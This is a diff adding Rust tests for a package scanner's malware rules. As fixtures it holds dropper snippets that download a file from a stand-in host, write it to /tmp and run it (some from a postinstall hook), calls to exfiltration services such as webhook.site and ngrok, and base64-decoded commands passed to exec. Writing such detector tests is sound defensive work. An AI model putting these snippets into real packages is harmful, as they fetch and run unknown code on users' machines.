@@ -4000,3 +4000,170 @@ async fn registry_name_errors_quote_a_specifier_a_shell_would_misread() {
     .await;
     assert!(text.contains("npm pack express"), "{text}");
 }
+
+// ---- Round 8: calibration of the package rules ----
+
+fn r8_rules(lang: file_scanner::package_scan::Lang, text: &str) -> Vec<(String, String)> {
+    let findings = file_scanner::package_scan::scan_source(lang, "f.src", text.as_bytes()).findings;
+    findings.into_iter().map(|f| (f.rule, f.severity)).collect()
+}
+
+fn r8_has(lang: file_scanner::package_scan::Lang, text: &str, rule: &str) -> bool {
+    r8_rules(lang, text).iter().any(|(r, _)| r == rule)
+}
+
+const R8_RUN: &str = "Download written to disk and run";
+
+#[test]
+fn r8_exfiltration_hosts_match_host_names_only() {
+    use file_scanner::package_scan::Lang::Js;
+    // sonner: a property access on a variable ending in `toast`.
+    for line in [
+        "if (toast.promise && toastType === 'loading') {}",
+        "toast.live(x); toast.me(); toast.pro.x; mytoast.online",
+        "const a = webhook.siteConfig; interact.shape(1); interact.show();",
+        "const u = 'https://example.com/x.ngrok.iox';",
+    ] {
+        assert!(!r8_has(Js, line, "Exfiltration endpoint"), "{line}");
+    }
+    for line in [
+        "fetch('https://abc123.oast.pro/x')",
+        "fetch('http://oast.fun')",
+        "const u = `https://x.y.oast.live/${id}`;",
+        "post('https://webhook.site/abc')",
+        "post('https://abc.interact.sh')",
+        "post('https://abc.ngrok.io/x')",
+        "post('https://x.burpcollaborator.net')",
+    ] {
+        assert!(r8_has(Js, line, "Exfiltration endpoint"), "{line}");
+    }
+}
+
+#[test]
+fn r8_compiled_typescript_dropper_is_high_like_the_plain_one() {
+    let hooked =
+        r#"{"name":"ts-demo","version":"1.0.0","scripts":{"postinstall":"node dist/setup.js"}}"#;
+    let head = "const node_https_1 = require('node:https');\nconst node_fs_1 = require('node:fs');\nconst node_child_process_1 = require('node:child_process');\nconst target = '/tmp/.helper';\n";
+    let get_plain = "https.get('https://d.example.invalid/h', (res) => {\n";
+    let get_ts = "node_https_1.default.get('https://d.example.invalid/h', (res) => {\n";
+    let write_plain = "  fs.writeFileSync(target, buf);\n";
+    let write_ts = "  node_fs_1.default.writeFileSync(target, buf);\n  (0, node_fs_1.writeFileSync)(target, buf);\n";
+    let runs = [
+        "  child_process.execSync(target);\n",
+        "  (0, node_child_process_1.execSync)(target);\n",
+        "  node_child_process_1.spawn(target, []).unref();\n",
+        "  (0, node_child_process_1.spawn)(target, [], {detached: true}).unref();\n",
+        "  node_child_process_1.default.spawn(target);\n",
+    ];
+    let mut tried = 0;
+    for get in [get_plain, get_ts] {
+        for write in [write_plain, write_ts] {
+            for run in runs {
+                let body = format!("{head}{get}{write}{run}}});\n");
+                let (level, _, _) = r7_npm(&[("package.json", hooked), ("dist/setup.js", &body)]);
+                assert!(is_high(&level), "{level:?}\n{body}");
+                tried += 1;
+            }
+        }
+    }
+    assert_eq!(tried, 20);
+    // The ordinary TypeScript output of a CLI that only fetches is not a dropper.
+    let cli = format!(
+        "{head}node_https_1.default.get('https://registry.example.invalid/x', (r) => {{ r.on('data', () => {{}}); }});\n(0, node_child_process_1.execSync)('git status');\n"
+    );
+    let (level, _, _) = r7_npm(&[("package.json", PKG), ("dist/cli.js", &cli)]);
+    assert!(!is_high(&level), "{level:?}");
+}
+
+#[test]
+fn r8_a_run_started_on_a_literal_is_a_run_when_tied_to_the_write() {
+    use file_scanner::package_scan::Lang::{Js, Python};
+    let head = "const cp = require('child_process'); const https = require('https'); const fs = require('fs');\nhttps.get('https://d.example.invalid/x', (r) => {\n  fs.writeFileSync('/tmp/x.sh', r);\n";
+    for run in [
+        "  cp.spawn('/tmp/x.sh');\n",
+        "  cp.spawn('sh', ['/tmp/x.sh']);\n",
+        "  cp.exec('sh /tmp/x.sh');\n",
+        "  cp.execSync(\"/tmp/x.sh\");\n",
+    ] {
+        let text = format!("{head}{run}}});\n");
+        assert!(r8_has(Js, &text, R8_RUN), "{text}");
+    }
+    // A fixed command that has nothing to do with the written cache file.
+    let head = "const cp = require('child_process'); const https = require('https'); const fs = require('fs');\nhttps.get('https://registry.example.invalid/latest', (r) => {\n  fs.writeFileSync('/tmp/cache-latest.json', r);\n";
+    for run in [
+        "  cp.spawn('git', ['status']);\n",
+        "  cp.execSync('npm run build');\n",
+        "  cp.spawn('node', ['scripts/build.js'], { stdio: 'inherit' });\n",
+        "  cp.execSync('sh -c \"echo done\"');\n",
+        "  cp.spawnSync('python3', ['-V']);\n",
+    ] {
+        let text = format!("{head}{run}}});\n");
+        assert!(!r8_has(Js, &text, R8_RUN), "{text}");
+    }
+    // A shell started on a variable still counts.
+    let text = format!("{head}  cp.execSync('sh ' + dest);\n}});\n");
+    assert!(r8_has(Js, &text, R8_RUN), "{text}");
+    // Python.
+    let py = "import subprocess, urllib.request\nurllib.request.urlretrieve('https://d.example.invalid/a', '/tmp/agent.bin')\nsubprocess.run(['/tmp/agent.bin'])\n";
+    assert!(r8_has(Python, py, R8_RUN));
+    let ok = "import subprocess, urllib.request\nurllib.request.urlretrieve('https://registry.example.invalid/l', '/tmp/cache.json')\nsubprocess.run(['git', 'status'])\nsubprocess.run(['make', 'all'])\n";
+    assert!(!r8_has(Python, ok, R8_RUN));
+}
+
+#[test]
+fn r8_python_async_download_write_and_run() {
+    use file_scanner::package_scan::Lang::Python;
+    let dropper = "import asyncio, os, stat, tempfile\nimport aiohttp\n\nasync def boot():\n    async with aiohttp.ClientSession() as s:\n        async with s.get('https://d.example.invalid/b') as r:\n            data = await r.read()\n    fd, path = tempfile.mkstemp()\n    os.write(fd, data)\n    os.close(fd)\n    proc = await asyncio.create_subprocess_exec(path)\n    await proc.wait()\n";
+    assert!(r8_has(Python, dropper, R8_RUN));
+    assert!(r8_has(Python, dropper, "Process execution"));
+    let shell = dropper.replace(
+        "create_subprocess_exec(path)",
+        "create_subprocess_shell(path)",
+    );
+    assert!(r8_has(Python, &shell, R8_RUN));
+    let (level, _, _) = r7_py(&[
+        ("pyproject.toml", "[project]\nname='a'\nversion='1'\n"),
+        ("asyncfast/__init__.py", dropper),
+    ]);
+    assert!(
+        matches!(level, PyRisk::High | PyRisk::Critical),
+        "{level:?}"
+    );
+    // A worker that runs the commands of its queue, with nothing written.
+    let worker = "import asyncio, aiohttp\nclass W:\n    async def run(self, job):\n        proc = await asyncio.create_subprocess_exec(*job.argv)\n        return await proc.wait()\n    async def loop(self):\n        async with aiohttp.ClientSession() as s:\n            async with s.get('http://q/next') as r:\n                self.job = await r.json()\n";
+    assert!(!r8_has(Python, worker, R8_RUN));
+    let (level, _, _) = r7_py(&[
+        ("pyproject.toml", "[project]\nname='a'\nversion='1'\n"),
+        ("jobrunner/__init__.py", worker),
+    ]);
+    assert!(
+        !matches!(level, PyRisk::High | PyRisk::Critical),
+        "{level:?}"
+    );
+}
+
+#[test]
+fn r8_a_decoded_payload_handed_to_a_process_call_is_high_alone() {
+    let (level, score, _) = r7_npm(&[
+        ("package.json", PKG),
+        ("index.js", "const cp = require('child_process');\ncp.exec(Buffer.from(process.argv[2], 'base64').toString());\n"),
+    ]);
+    assert!(is_high(&level), "{level:?} {score}");
+    let (level, _, _) = r7_py(&[(
+        "setup.py",
+        "from setuptools import setup\nimport os, base64, sys\nos.system(base64.b64decode(sys.argv[1]))\nsetup(name='x', version='1')\n",
+    )]);
+    assert!(
+        matches!(level, PyRisk::High | PyRisk::Critical),
+        "{level:?}"
+    );
+    // An ordinary exec of a fixed string stays low.
+    let (level, _, _) = r7_npm(&[
+        ("package.json", PKG),
+        (
+            "index.js",
+            "const cp = require('child_process');\ncp.exec('git status');\n",
+        ),
+    ]);
+    assert!(!is_high(&level), "{level:?}");
+}
